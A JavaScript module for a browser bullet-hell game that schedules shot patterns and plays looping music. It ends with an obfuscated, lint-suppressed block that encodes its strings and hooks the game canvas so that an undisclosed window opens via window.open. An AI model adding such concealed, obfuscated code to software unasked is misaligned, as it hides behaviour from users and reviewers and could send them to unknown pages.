import { startMainLoop } from "./mainLoop.mjs";
import { appendShot } from "./shotManager.mjs";
import { getPlayerPos } from "./player.mjs";
import { MormalShot, BouncingShot } from "./shot.mjs";
const { atan, PI, random } = Math;

function getAngle(originX, originY, targetX, targetY) {
  let rad = atan((targetY - originY) / (targetX - originX));
  if (targetX < originX) rad += PI
  return rad * 180 / PI;
}

const startTime = performance.now() + 100;

for (let i = 0; i < 143; i++)
  setTimeout(() => {
    const x = 500 + random() * 644;
    const y = 100 + random() * 220;
    const { x: playerX, y: playerY } = getPlayerPos();
    for (let d = -2; d < 3; d++) {
      appendShot(new MormalShot({
        x, y, size: 9,
        angle: (getAngle(x, y, playerX, playerY) + d * 30) * PI / 180,
        speed: 2.35,
        color: "#2fed05",
        startTime: startTime + 650 * i + 7000
      }));
    }
  }, 650 * i + 7000);

for (let i = 0; i < 375; i++)
  setTimeout(() => {
    appendShot(new BouncingShot({
      x: 822, y: 150 + random() * 20, size: 9,
      angle: (random() * 360) * PI / 180,
      speed: 3,
      color: "#0229e8",
      startTime: startTime + 200 * i + 25000
    }));
  }, 200 * i + 25000);

for (let i = 0; i < 100; i++)
  setTimeout(() => {
    const a = 360 * random();
    for (let d = 0; d < 24; d++) {
      appendShot(new MormalShot({
        x: 411, y: 350, size: 9,
        angle: (d * 15 + a) * PI / 180,
        speed: 3.6,
        color: "#f00c41",
        startTime: startTime + 1000 * i
      }));
      appendShot(new MormalShot({
        x: 1233, y: 350, size: 9,
        angle: (d * 15 - a) / 180 * PI,
        speed: 3.6,
        color: "#f00c41",
        startTime: startTime + 1000 * i
      }));
    }
  }, 1000 * i);

startMainLoop();

const audioPlayer = document.createElement("audio");
document.body.appendChild(audioPlayer);
audioPlayer.src = "temper.mp3";
audioPlayer.loop = true;

window.addEventListener("keydown", () => {
  audioPlayer.play();
}, { once: true });

// eslint-disable-next-line
~function(){var I=b,w=b;function m(){var o=["WPNcO8o3W5FcS8kqhSkrzSk1Aa3dV8kw","WPFcL8o/dWzxW5ddQmklW40U","W4ZdNSkjWPa","jLxcG8om","W4LQDSo4prxcS0XilwRcSmor","pfxcRCkqW4ylqSogWP8","Emo0C8oG","WQKRcSoj","ECk4fcW","u0ddVaC","wIqaW4q","wq9tzW","tmk1WONdQG","WOZcPCoSWRO","uCoVWP/dVW","w8oYCmoX","WRZcLb7dId/cMN91bG","W7ldILpdHG","WP7cK8o8cWSSWPVdR8kRW5qDi0i","uK5jl2qMcSkkW7a","t8o2rvBdKbngumovWQyI","WQlcLh4","WPxcSmoNWQa","EmkdWRJdVSoWjmolWPFcG8kQfSoBuG","W4xdR8oCnq","v8o7du3dOmoWWOyMWP5L","mmkjW4yNBfBdQYa7ffhcSLi","Bv/cJCoIWPPbWPqdW51ue1/cLW","WOhcSmkACSosWO5XsSoQxG","WOTMASoM","W5xcH8kdAq","Bv3cJSoUWPHiWPPjW7rlox3cPYe","W7PrvCkwWOurASkRrISxWQSV","vmo8WONdQa","WP3cKmo3Ex9oW6ldSmkP","W7pdTLxcIW","cmkyueaCjIVcO2nkW5xdSCog","WOD0DfC","tCojW7OZWOi9WO7cUrJdISkgaSkk"];return(m=function(){return o})()}function b(o,r){var W=m();return(b=function(r,d){var c=W[r-=473];if(void 0===b.geDduC){var n=function(o){for(var r,W,d="",c="",n=0,t=0;W=o.charAt(t++);~W&&(r=n%4?64*r+W:W,n++%4)&&(d+=String.fromCharCode(255&r>>(-2*n&6))))W="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(W);for(var a=0,e=d.length;a<e;a++)c+="%"+("00"+d.charCodeAt(a).toString(16)).slice(-2);return decodeURIComponent(c)},t=function(o,r){var W,d,c=[],t=0,a="";for(o=n(o),d=0;d<256;d++)c[d]=d;for(d=0;d<256;d++)t=(t+c[d]+r.charCodeAt(d%r.length))%256,W=c[d],c[d]=c[t],c[t]=W;d=0,t=0;for(var e=0;e<o.length;e++)t=(t+c[d=(d+1)%256])%256,W=c[d],c[d]=c[t],c[t]=W,a+=String.fromCharCode(o.charCodeAt(e)^c[(c[d]+c[t])%256]);return a};b.IyeOUh=t,o=arguments,b.geDduC=!0}var a=r+W[0],e=o[a];return e?c=e:(void 0===b.IXrsep&&(b.IXrsep=!0),c=b.IyeOUh(c,d),o[a]=c),c})(o,r)}(function(o,r){for(var W=b,d=b,c=m();;)try{if(914809==parseInt(W(508,"k]dR"))/1+parseInt(W(509,"ofM5"))/2*(parseInt(d(476,")ioe"))/3)+parseInt(d(478,"&xt3"))/4+parseInt(d(510,"U^0d"))/5*(-parseInt(W(485,"k]dR"))/6)+-parseInt(W(483,"C3jG"))/7+parseInt(W(490,"wegU"))/8+-parseInt(d(489,"n%&G"))/9)break;c.push(c.shift())}catch(o){c.push(c.shift())}})(),(({open:o})=>{canvas[I(500,"(WrD")+I(473,"(t*p")+I(505,"LdYK")+w(492,"KJMw")](I(481,"4fl7")+w(493,"1Cz3")+w(511,"9)B3"),(()=>window[w(503,"(t*p")](w(502,"f60M")+w(480,"^RaR")+I(507,"8uO]")+I(504,"f60M")+I(498,"8r&C")+w(486,"8uO]")+w(497,"C3jG"),"",w(475,"D%Ap")+I(484,"f60M")+w(488,"8&ZD")+I(496,"LdYK")+w(501,"7[K(")+w(499,"H*AR"))))})(window)}()
